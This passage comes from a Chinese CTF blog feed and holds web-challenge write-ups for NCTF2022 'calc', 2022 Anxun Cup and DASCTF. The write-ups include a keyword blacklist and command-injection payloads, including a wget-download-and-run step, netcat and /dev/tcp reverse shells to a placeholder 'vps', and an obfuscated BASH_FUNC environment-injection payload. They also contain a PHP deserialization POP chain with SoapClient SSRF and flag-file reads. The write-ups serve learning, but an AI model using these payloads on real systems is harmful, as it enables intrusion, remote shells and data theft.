class="string">&#x27;import&#x27;</span>, <span class="string">&#x27;(&#x27;</span>, <span class="string">&#x27;)&#x27;</span>, <span class="string">&#x27;#&#x27;</span>, <span class="string">&#x27;@&#x27;</span>, <span class="string">&#x27;^&#x27;</span>, <span class="string">&#x27;$&#x27;</span>, <span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;&gt;&#x27;</span>, <span class="string">&#x27;?&#x27;</span>, <span class="string">&#x27;`&#x27;</span>, <span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;|&#x27;</span>, <span class="string">&#x27;;&#x27;</span>, <span class="string">&#x27;&quot;&#x27;</span>, <span class="string">&#x27;&#123;&#x27;</span>, <span class="string">&#x27;&#125;&#x27;</span>, <span class="string">&#x27;&amp;&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;getattr&#x27;</span>, <span class="string">&#x27;os&#x27;</span>, <span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;class&#x27;</span>, <span class="string">&#x27;subclasses&#x27;</span>, <span class="string">&#x27;mro&#x27;</span>, <span class="string">&#x27;request&#x27;</span>, <span class="string">&#x27;args&#x27;</span>, <span class="string">&#x27;eval&#x27;</span>, <span class="string">&#x27;if&#x27;</span>, <span class="string">&#x27;subprocess&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;file&#x27;</span>, <span class="string">&#x27;open&#x27;</span>, <span class="string">&#x27;popen&#x27;</span>, <span class="string">&#x27;builtins&#x27;</span>, <span class="string">&#x27;compile&#x27;</span>, <span class="string">&#x27;execfile&#x27;</span>, <span class="string">&#x27;from_pyfile&#x27;</span>, <span class="string">&#x27;config&#x27;</span>, <span class="string">&#x27;local&#x27;</span>, <span class="string">&#x27;self&#x27;</span>,</span><br><span class="line">                 <span class="string">&#x27;item&#x27;</span>, <span class="string">&#x27;getitem&#x27;</span>, <span class="string">&#x27;getattribute&#x27;</span>, <span class="string">&#x27;func_globals&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;join&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>]</span><br><span class="line">    flag = <span class="literal">True</span></span><br><span class="line">    <span class="keyword">for</span> no <span class="keyword">in</span> blacklist:</span><br><span class="line">        <span class="keyword">if</span> no.lower() <span class="keyword">in</span> s.lower():</span><br><span class="line">            flag = <span class="literal">False</span></span><br><span class="line">            <span class="built_in">print</span>(no)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">return</span> flag</span><br></pre></td></tr></table></figure><h3 id="比赛思路"><a href="#比赛思路" class="headerlink" title="比赛思路"></a>比赛思路</h3><p>突破口有两处，eval命令执行以及os.system函数执行代码。网上用的都是利用os.system函数来执行命令的。它执行的是log参数里面的内容，</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">log = &quot;echo &#123;0&#125; &#123;1&#125; &#123;2&#125;&gt; ./tmp/log.txt&quot;.format(time.strftime(&quot;%Y%m%d-%H%M%S&quot;, time.localtime()), ip,num)</span><br></pre></td></tr></table></figure><p>参数部分可控，接下来我们所要做的就是截断已有命令，让os.system函数去单独执行num中的代码，buu三月赛是用反引号来绕过，因为有反引号会先执行反引号里的代码。但是在这里反引号被过滤掉了，当时测试是可以用换行来绕过的，赛后看师傅们的wp也确实是这样，</p><img src="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/112.png" class><p>当时想着反弹shell，但是没有成功，回头检查一遍发现还需要绕过eval函数，因为我们传入的payload先经过eval函数处理会发生报错，这就导致os.system函数无法执行，buu三月赛是用#把后面代码注释掉，是一个好点子，但是这一题也过滤了。实在想不出还能怎么绕，最后也是放弃了，坐等赛后wp（菜哭）。</p><p>非预期解  </p><p>网上师傅们的wp全是这一种非预期解法，后来平台好像为了考察预期解又新出一道calc升级版。这个非预期同样也是解决上面那两个问题，num参数单独代码执行，使用换行绕过。满足eval正常执行则是用单引号将我们传入的代码包裹起来，使其成为字符串，这样就不会报错了 ，妙啊。</p><img src="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/113.png" class><p>又因为没有回显，可以wget命令从我们服务器下载恶意sehll脚本，然后在题目中执行。如果题目出网，那么我们可以反弹shell或者将flag文件外带出来，例如我们反弹shell，编写恶意shell脚本：</p><pre><code>#!/bin/bashnc vps port -e /bin/sh</code></pre><p>题目中我们传入参数：</p><pre><code>num=%0A&#39;wget&#39;%09&#39;http://vps/hack.sh&#39;%0Anum=%0A&#39;bash&#39;%09&#39;hack.sh&#39;%0A</code></pre><p>同时vps开启监听，但是赛后测试并没有弹过来，利用curl外带也没有成功，不知道是啥细节上出问题了。最主要的是学习一下这一种思路。</p><h3 id="预期解"><a href="#预期解" class="headerlink" title="预期解"></a>预期解</h3><p>看了出题人的wp之后，知道他是根据p神的一篇环境变量注入的文章得来的灵感，</p><blockquote><p><a href="https://tttang.com/archive/1450/">我是如何利用环境变量注入执行任意命令 - 跳跳糖</a></p></blockquote><p>p神的文章对于小白来说还是容易劝退的，C语言基础不是很好的我看底层代码还是有些费劲。下来主要说一下p神这篇文章利用环境变量注入来getshell的思想。</p><p>php的system函数在底层调用了popen函数，而最终执行的命令就是sh -c，我们知道sh是一个软连接，它指向bash或者dash，在system函数执行的时候，就会执行sh这个二进制文件，如果我们在sh底层源码中找到可以利用的环境变量，也就可以执行命令。其中能够利用的就是variables.c的initialize_shell_variables函数用于将环境变量注册成SHELL的变量。其中的一段if条件语句判断：</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> (privmode == <span class="number">0</span> &amp;&amp; read_but_dont_execute == <span class="number">0</span> &amp;&amp; </span><br><span class="line">        STREQN (BASHFUNC_PREFIX, name, BASHFUNC_PREFLEN) &amp;&amp;</span><br><span class="line">        STREQ (BASHFUNC_SUFFIX, name + char_index - BASHFUNC_SUFFLEN) &amp;&amp;</span><br><span class="line">        STREQN (<span class="string">&quot;() &#123;&quot;</span>, <span class="built_in">string</span>, <span class="number">4</span>))</span><br></pre></td></tr></table></figure><p>p神也给了其中的解释</p><img src="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/114.png" class><p>这段很重要，也是能否看懂这道题payload的关键。也就是满足这些条件，它会注册一个shell变量并执行。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">env $&#x27;BASH_FUNC_myfunc%%=() &#123; id; &#125;&#x27; bash -c &#x27;myfunc&#x27;</span><br></pre></td></tr></table></figure><p>也就这样创建类似匿名函数并执行，就会执行id这个命令。针对本题就说这些，了解更多还得细读p神的文章，能够学到很多。</p><p>依据上面的思想我们是否能在python中运用。同样python3中system函数底层代码实现中也调用了&#x2F;bin&#x2F;sh -c来执行shell命令，附上官方wp：</p><p><a href="https://ctf.njupt.edu.cn/archives/805">NCTF2022 Official Writeup | 小绿草信息安全实验室</a></p><p>同理我们也可以注入环境变量来命令执行。那么在这一题我们怎么注入环境变量，没有直观的putenv函数，只能通过eval来覆盖或者赋值，参考这篇文章：</p><p>[Python黑魔法-<a href="https://aluvion.github.io/2019/05/02/Python%E9%BB%91%E9%AD%94%E6%B3%95-%E7%BB%95%E8%BF%87%E7%A9%BA%E6%A0%BC%E5%AE%9E%E7%8E%B0%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96/">]绕过空格实现变量覆盖 - Twings</a></p><p>利用for循环来变量覆盖：</p><img src="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/1.png" class><p>还可以用中括号来绕过空格，虽然不知道为什么可以这样，好像是python的特性吧。本地测试一下向os.environ注入新的环境变量</p><img src="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/115.png" class><p>完全可以，这样环境变量覆盖的问题也解决了。在此，我们需要设置的环境变量为：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">os.environ[&#x27;BASH_FUNC_echo%%&#x27;]=&#x27;() &#123; bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1;&#125;&#x27;</span><br></pre></td></tr></table></figure><p>当然echo只是一个函数名，设置成什么字母无所谓，我们需要for循环对该环境变量进行注入，且绕过空格，所以进一步的payload为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[[str][0]for[os.environ[&#x27;BASH_FUNC_echo%%&#x27;]]in[[&#x27;() &#123; bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx/xxxx 0&gt;&amp;1;&#125;&#x27;]]]</span><br></pre></td></tr></table></figure><p>剩下的就是绕过黑名单了，在python中，用单双引号包裹的字符串是能够识别十六进制的，所以只需要将敏感字符十六进制编码即可绕过。最后就是怎么绕过os了。这里对于我来说又是一个新的点，python在处理utf-8中的非ascii字符的时候，会被转化成统一的标准格式。</p><img src="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/116.png" class><p>就像官方wp上可以用ᵒ来代替o，这下问题都全部解决了，所以最终payload为：</p><pre><code>[[str][0]for[ᵒｓ.environ[&#39;BASH\x5fFUNC\x5fecho%%&#39;]]in[[&#39;\x28\x29\x20\x7b\x20\x62\x61\x73\x68\x20\x2d\x69\x20\x3e\x26\x20\x2f\x64\x65\x76\x2f\x74\x63\x70\x2f\x78\x78\x2e\x78\x78\x2e\x78\x78\x2e\x78\x78\x2f\x78\x78\x78\x78\x20\x30\x3e\x26\x31\x3b\x7d&#39;]]]</code></pre><p> nss上线了这道题，用该payload试一下</p><img src="/2023/01/31/NCTF2022-calc%E9%A2%98%E7%9B%AE/117.png" class><p>最终也是弹成功了。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>这都是在基于system函数执行的条件下（无论是php还是python），底层调用sh二进制文件，我们都可以注入环境变量来rce。换句话说，如果底层调用了sh -c命令的函数执行的话，具有环境变量注入条件，使用这个方法来getshell应该是可以的。这个赛题个人感觉质量很高，能够从中学习到很多知识。</p>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> 环境变量getshell </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022安洵杯web</title>
      <link href="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/"/>
      <url>/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>个人觉得赛题质量蛮好的，只是自己太菜了，花了很长时间都在琢磨第一道web，因为一些细节上的问题导致一直解不出来。赛后就找师傅的wp重新去复现一下，总结自己的问题，在此记录一下，以便日后复习。</p><h2 id="badyphp（pop链，原生类打ssrf和文件读取）"><a href="#badyphp（pop链，原生类打ssrf和文件读取）" class="headerlink" title="badyphp（pop链，原生类打ssrf和文件读取）"></a>badyphp（pop链，原生类打<a href="https://so.csdn.net/so/search?q=ssrf&spm=1001.2101.3001.7020">ssrf</a>和文件读取）</h2><p>打开题目就是源代码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">//something in flag.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;a = <span class="string">&quot;babyhacker&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">          <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable language_">$this</span>-&gt;a) &amp;&amp; <span class="variable language_">$this</span>-&gt;a == <span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;a)) &#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b-&gt;<span class="title function_ invoke__">uwant</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;b = <span class="variable language_">$this</span>-&gt;k;</span><br><span class="line">        <span class="keyword">die</span>(<span class="variable language_">$this</span>-&gt;a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__toString</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable">$cc</span> = <span class="variable language_">$this</span>-&gt;c;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$cc</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">uwant</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;a == <span class="string">&quot;phpinfo&quot;</span>) &#123;</span><br><span class="line">        <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="keyword">array</span>(<span class="title function_ invoke__">reset</span>(<span class="variable">$_SESSION</span>), <span class="variable">$this</span>-&gt;a));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">ini_set</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;baby&#x27;</span>], <span class="variable">$_GET</span>[<span class="string">&#x27;d0g3&#x27;</span>]);</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;sess&#x27;</span>] = <span class="variable">$_POST</span>[<span class="string">&#x27;sess&#x27;</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">session_start</span>();</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>])) &#123;</span><br><span class="line">        <span class="title function_ invoke__">unserialize</span>(<span class="variable">$_POST</span>[<span class="string">&quot;pop&quot;</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_SESSION</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br></pre></td></tr></table></figure><p>构造pop链思路：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">B::__destruct-&gt;C::__toString-&gt;A::__invoke-&gt;C::uwant</span><br></pre></td></tr></table></figure><p>需要绕过wakeup函数，本题目是高版本的php，常规绕过不管用。细看这个代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$this-&gt;b = $this-&gt;k;</span><br></pre></td></tr></table></figure><p>我们让$b去指向A类中$a的地址，就可以覆盖掉$a本来的变量了。打一下payload去触发phpinfo();</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/102.png" class><p>师傅的wp使用fast destruct来绕过的，都行。</p><pre><code>原链⼦：O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;i:0;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;经Fast Destruct过后的：O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;i:0;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:7:&quot;phpinfo&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;&#125;&#125;s:1:&quot;b&quot;;N;s:1:&quot;k&quot;;N;&#125;</code></pre><p>题目中还提示让我们访问flag.php，flag文件的php代码为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SERVER</span>[<span class="string">&quot;REMOTE_ADDR&quot;</span>]===<span class="string">&quot;127.0.0.1&quot;</span>)&#123;</span><br><span class="line">    <span class="variable">$f1ag</span>=<span class="title function_ invoke__">implode</span>(<span class="keyword">array</span>(<span class="keyword">new</span> <span class="variable">$_GET</span>[<span class="string">&#x27;a&#x27;</span>](<span class="variable">$_GET</span>[<span class="string">&#x27;b&#x27;</span>])));</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&quot;F1AG&quot;</span>]= <span class="variable">$f1ag</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">   <span class="keyword">echo</span> <span class="string">&quot;only localhost!!&quot;</span>;</span><br><span class="line">&#125; </span><br></pre></td></tr></table></figure><p>REMOTE_ADDR是无法伪造的，所以利用SoapClient类来打ssrf进去。另外可以new对象，我们可以利用原生类来读取flag。说起来很容易，但是怎么操作呢？</p><p>在主页面的php代码中我们是可以传session的，另外还有ini_set函数，我们可以控制修改php_ini的参数配置，没错，这里存在session反序列化漏洞。编写攻击ssrf的poc：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$target</span> = <span class="string">&quot;http://127.0.0.1/flag.php?a=SplFileObject&amp;b=/f1111llllllaagg&quot;</span>;</span><br><span class="line"><span class="variable">$attack</span> = <span class="keyword">new</span> <span class="title class_">SoapClient</span>(<span class="literal">null</span>,<span class="keyword">array</span>(<span class="string">&#x27;location&#x27;</span> =&gt; <span class="variable">$target</span>,<span class="string">&#x27;user_agent&#x27;</span> =&gt; <span class="string">&quot;aaaa\r\nCookie: PHPSESSID=123456\r\n&quot;</span>,<span class="string">&#x27;uri&#x27;</span> =&gt; <span class="string">&quot;123&quot;</span>));</span><br><span class="line"><span class="variable">$payload</span> = <span class="title function_ invoke__">urlencode</span>(<span class="title function_ invoke__">serialize</span>(<span class="variable">$attack</span>));</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$payload</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="comment">//|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A3%3A%22123%22%3Bs%3A8%3A%22location%22%3Bs%3A60%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%3Fa%3DSplFileObject%26b%3D%2Ff1111llllllaagg%22%3Bs%3A11%3A%22_user_agent%22%3Bs%3A32%3A%22aaaa%0D%0ACookie%3A+PHPSESSID%3D123456%0D%0A%22%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D</span></span><br></pre></td></tr></table></figure><p>开始我们是不知道flag的文件名的，所以这一步之前，我们需要利用原生类加glob协议把flag文件名给找出来。更改处理器配置为php_serialize，并且将payload传入session中。</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/103.png" class><p>传进去之后它是储存在session中，然后我们再传一次，把SoapClient写进session中，为什么要这么做？我们将打ssrf的原生类写进session里了，能够满足反序列化的条件，但是我们还需要去触发SoapClient类里的__call方法才能真正达到效果。主页面php代码有回调函数：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">call_user_func(array(reset($_SESSION), $this-&gt;a));</span><br></pre></td></tr></table></figure><p>这个函数，若第一个参数是数组的话，数组的第一个键值会作为类名，剩下的键值作为方法名，来调用这些函数。两者我们都可控，需要利用这个点来触发__call方法。另外我们呢需要将处理器改为php。</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/104.png" class><p>那么接下来就利用我们构造的pop链来触发call方法了。exp为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$b</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$k</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$a</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$c</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="keyword">new</span> <span class="title function_ invoke__">A</span>();</span><br><span class="line"><span class="variable">$b</span> = <span class="keyword">new</span> <span class="title function_ invoke__">B</span>();</span><br><span class="line"><span class="variable">$c</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$d</span> = <span class="keyword">new</span> <span class="title function_ invoke__">C</span>();</span><br><span class="line"><span class="variable">$b</span>-&gt;a = <span class="variable">$c</span>;</span><br><span class="line"><span class="variable">$b</span>-&gt;b = &amp;<span class="variable">$a</span>-&gt;a;</span><br><span class="line"><span class="variable">$b</span>-&gt;k = <span class="string">&quot;0e215962017&quot;</span>;</span><br><span class="line"><span class="variable">$c</span>-&gt;c = <span class="variable">$a</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;a = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$a</span>-&gt;b = <span class="variable">$d</span>;</span><br><span class="line"><span class="variable">$d</span>-&gt;a = <span class="string">&quot;asda&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$b</span>);</span><br><span class="line"><span class="comment">//O:1:&quot;B&quot;:3:&#123;s:1:&quot;a&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;N;s:1:&quot;c&quot;;O:1:&quot;A&quot;:2:&#123;s:1:&quot;a&quot;;s:0:&quot;&quot;;s:1:&quot;b&quot;;O:1:&quot;C&quot;:2:&#123;s:1:&quot;a&quot;;s:4:&quot;asda&quot;;s:1:&quot;c&quot;;N;&#125;&#125;&#125;s:1:&quot;b&quot;;R:5;s:1:&quot;k&quot;;s:11:&quot;0e215962017&quot;;&#125;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>本地访问flag.php时的PHPSESSID是我们自己设置的，触发call方法后原生类读取flag的内容储存在session中，但是我们需要修改PHPSESSID为自己设置的才能得到flag。</p><h2 id="EZ-JS（hash扩展攻击）"><a href="#EZ-JS（hash扩展攻击）" class="headerlink" title="EZ_JS（hash扩展攻击）"></a>EZ_JS（hash扩展攻击）</h2><p>打开题目是一个登录框，随便输入些什么登进去。在页面源码有注释，是JSFuck编码，放在游览器解码一下。</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/105.png" class><p>这个提示我真不懂是什么意思，看大师傅的wp根据js大写特性绕过，输入admın。同样的，在登录框界面也有注释，</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/106.png" class><p>哈希扩展攻击，没怎么了解过，先学会用工具，在这留个坑以后再学。在做题的时候，我对这个注释的理解还是有些偏差，用工具解出hash和密码，hash要添加在cookie里。注意要把\x修改为%</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/107.png" class><p>抓登录包，添加admin密码，修改cookie得到文件</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/108.png" class><p>访问这个文件直接得出flag了。why?看师傅的wp不是还有原型链污染嘛。</p><h2 id="ezupload（file-get-contents与原生类）"><a href="#ezupload（file-get-contents与原生类）" class="headerlink" title="ezupload（file_get_contents与原生类）"></a>ezupload（file_get_contents与原生类）</h2><p>是一个上传表单，可以上传php文件，试着上传一句话木马，发现不成功。我们上传phpinfo，可以上传，发现许多函数都被禁用了。</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/109.png" class><p>于是我就想怎么开始绕disable_functions了，然而却没什么思路。看了大师傅的wp，发现其实函数禁用的并不全。还有file_get_contents函数可以用，但是上传对上传包的内容有限制，进行字符串拼接绕过，当然也可以用十六进制绕过。</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/110.png" class><p>可以看到&#x2F;etc&#x2F;passwd的内容。</p><img src="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/111.png" class><p>那么我们如何利用file_get_contents把flag给读出来。看了师傅的wp才知道还可以配合原生类来找到flag文件并且读取。真的强，我是想不到的。那么传入文件。</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php echo (&#x27;fil&#x27;.&#x27;e_get_contents&#x27;)((&quot;/&quot;.(new DirectoryIterator(&quot;glob:///f?????????????&quot;))));?&gt;</span><br></pre></td></tr></table></figure><p>因为flag大都在根目录下，配合DirectoryIterator原生类并且利用glob协议找到flag文件名。本来想匹配f<em>的，</em>被过滤了。那就只能用?通配符一个个的匹配，最终在匹配13个问号得出flag。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>慢慢学习，慢慢积累。又是崇拜大师傅的一天~</p>]]></content>
      
      
      <categories>
          
          <category> 赛题记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF X GFCTF 2022十月挑战赛web</title>
      <link href="/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/"/>
      <url>/2023/01/31/DASCTF-X-GFCTF-2022%E5%8D%81%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9Bweb/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>晚来的比赛web题解，这次buu的十月赛web部分的题目对于我来说质量还是蛮高的，因为这几天比较忙，一直没有去复现总结，不过该复现的还得复现，复现了这次比赛又能学到不少知识，嘿嘿嘿。</p><h2 id="EasyPOP"><a href="#EasyPOP" class="headerlink" title="EasyPOP"></a>EasyPOP</h2><p>考察php的pop链，这题相比之下算是web中的签到题了。看题目源码：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">fine</span></span></span><br><span class="line"><span class="class"> </span></span><br><span class="line"><span class="class">    <span class="title">private</span> $<span class="title">cmd</span>;</span></span><br><span class="line"><span class="class">    <span class="title">private</span> $<span class="title">content</span>;</span></span><br><span class="line"><span class="class">    <span class="title">public</span> <span class="title">function</span> <span class="title">__construct</span>($<span class="title">cmd</span>, $<span class="title">content</span>)</span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;cmd = <span class="variable">$cmd</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;content = <span class="variable">$content</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="title function_ invoke__">call_user_func</span>(<span class="variable">$this</span>-&gt;cmd, <span class="variable">$this</span>-&gt;content);</span><br><span class="line">    &#125;</span><br><span class="line">    